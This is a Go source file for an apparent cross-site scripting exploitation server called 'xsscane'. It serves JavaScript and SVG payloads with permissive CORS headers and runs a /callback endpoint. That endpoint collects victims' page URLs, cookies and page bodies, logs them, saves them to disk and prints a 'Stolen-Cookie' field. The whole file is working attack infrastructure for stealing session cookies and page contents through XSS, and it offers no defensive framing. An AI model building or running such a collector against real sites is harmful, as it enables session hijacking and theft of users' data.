package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"strings"
	"text/template"
	"time"
)

var banner string = `
 ___    ___ ________   ________  ________  ________  ________   _______      
|\  \  /  /|\   ____\ |\   ____\|\   ____\|\   __  \|\   ___  \|\  ___ \     
\ \  \/  / | \  \___|_\ \  \___|\ \  \___|\ \  \|\  \ \  \\ \  \ \   __/|    
 \ \    / / \ \_____  \\ \_____  \ \  \    \ \   __  \ \  \\ \  \ \  \_|/__  
  /     \/   \|____|\  \\|____|\  \ \  \____\ \  \ \  \ \  \\ \  \ \  \_|\ \ 
 /  /\   \     ____\_\  \ ____\_\  \ \_______\ \__\ \__\ \__\\ \__\ \_______\
/__/ /\ __\   |\_________\\_________\|_______|\|__|\|__|\|__| \|__|\|_______|
|__|/ \|__|   \|_________\|_________|                          by @jackrendor`

type callBackStruct struct {
	Body   string `json:"body"`
	URL    string `json:"url"`
	Cookie string `json:"cookie"`
}

func rootHandler(w http.ResponseWriter, r *http.Request) {
	//http.CanonicalHeaderKey()
	w.Header().Add("Access-Control-Allow-Origin", "*")
	w.Header().Add("Access-Control-Allow-Credentials", "true")
	w.Header().Add("Access-Control-Allow-Headers", "*")

	fmt.Printf("\n\n  \u001b[30;102m[%s] Connected\u001b[0m\n", r.RemoteAddr)
	fmt.Printf("\u001b[93m%s\u001b[0m \u001b[96m%s%s\u001b[0m\n", r.Method, r.Host, r.RequestURI)
	for key, value := range r.Header {
		fmt.Printf("\u001b[93m%s\u001b[0m: \u001b[96m%s\u001b[0m\n", key, strings.Join(value, ", "))
	}
	body, bodyErr := io.ReadAll(r.Body)
	if bodyErr != nil {
		fmt.Println("Error reading body:", bodyErr.Error())
		return
	}
	fmt.Println("\u001b[96m" + string(body) + "\u001b[0m")
	tmpl, _ := template.ParseFiles("xsscane.js")
	tmpl.Execute(w, r.Host)
}

func svgHandler(w http.ResponseWriter, r *http.Request) {
	//http.CanonicalHeaderKey()
	w.Header().Add("Access-Control-Allow-Origin", "*")
	w.Header().Add("Access-Control-Allow-Credentials", "true")
	w.Header().Add("Access-Control-Allow-Headers", "*")
	w.Header().Add("Content-Type", "image/svg+xml")

	fmt.Printf("\n\n  \u001b[30;102m[%s] Connected\u001b[0m\n", r.RemoteAddr)
	fmt.Printf("\u001b[93m%s\u001b[0m \u001b[96m%s%s\u001b[0m\n", r.Method, r.Host, r.RequestURI)
	for key, value := range r.Header {
		fmt.Printf("\u001b[93m%s\u001b[0m: \u001b[96m%s\u001b[0m\n", key, strings.Join(value, ", "))
	}
	body, bodyErr := io.ReadAll(r.Body)
	if bodyErr != nil {
		fmt.Println("Error reading body:", bodyErr.Error())
		return
	}
	fmt.Println("\u001b[96m" + string(body) + "\u001b[0m")
	tmpl, _ := template.ParseFiles("xsscane.svg")
	tmpl.Execute(w, r.Host)
}

func callBackFromScript(w http.ResponseWriter, r *http.Request) {
	w.Header().Add("Access-Control-Allow-Origin", "*")
	w.Header().Add("Access-Control-Allow-Credentials", "true")
	w.Header().Add("Access-Control-Allow-Headers", "*")

	if r.Method != "POST" {
		return
	}
	fmt.Printf("  \u001b[30;102m[%s] Callback Received\u001b[0m\n", r.RemoteAddr)
	var jsonData callBackStruct

	if jsonErr := json.NewDecoder(r.Body).Decode(&jsonData); jsonErr != nil {
		log.Println("Decoding error in callBackFromScript:", jsonErr.Error())
		return
	}

	filename := fmt.Sprintf("%d.html", time.Now().UnixNano())
	os.Mkdir("./data", os.ModePerm)
	writeErr := os.WriteFile(
		"./data/"+filename,
		[]byte("URL: "+jsonData.URL+"\nCOOKIE: "+jsonData.Cookie+"\nBODY:\n"+jsonData.Body),
		0644,
	)

	if writeErr != nil {
		log.Println("Writing error in callBackFromScript:", writeErr.Error())
	}
	fmt.Printf("\u001b[93mURL\u001b[0m: \u001b[96m%s\u001b[0m\n", jsonData.URL)
	fmt.Printf("\u001b[93mOrigin\u001b[0m: \u001b[96m%s\u001b[0m\n", strings.Join(r.Header.Values("Origin"), ", "))
	if len(r.UserAgent()) > 0 {
		fmt.Printf("\u001b[User-Agent\u001b[0m: \u001b[96m%s\u001b[0m\n", r.UserAgent())
	}
	fmt.Printf("\u001b[93mX-Forwarded-For\u001b[0m: \u001b[96m%s\u001b[0m\n", strings.Join(r.Header.Values("X-Forwarded-For"), ", "))
	fmt.Printf("\u001b[93mStolen-Cookie\u001b[0m: \u001b[96m%s\u001b[0m\n", jsonData.Cookie)

}

func main() {
	var listeningVar string
	flag.StringVar(&listeningVar, "listen", "0.0.0.0:8000", "Listening address")
	flag.Parse()

	http.HandleFunc("/callback", callBackFromScript)
	http.HandleFunc("/", rootHandler)
	http.HandleFunc("/image.svg", svgHandler)

	fmt.Printf("\u001b[36m%s\u001b[0m\n", banner)
	fmt.Println("\n-----------------")
	fmt.Println(" Listening on:", listeningVar)
	fmt.Println(" JavaScript Payload:", listeningVar+"/*")
	fmt.Println(" SVG Payload:", listeningVar+"/image.svg")
	fmt.Println(" Callback for Payload:", listeningVar+"/callback")
	fmt.Println("-----------------")
	log.Println(http.ListenAndServe(listeningVar, nil))
}
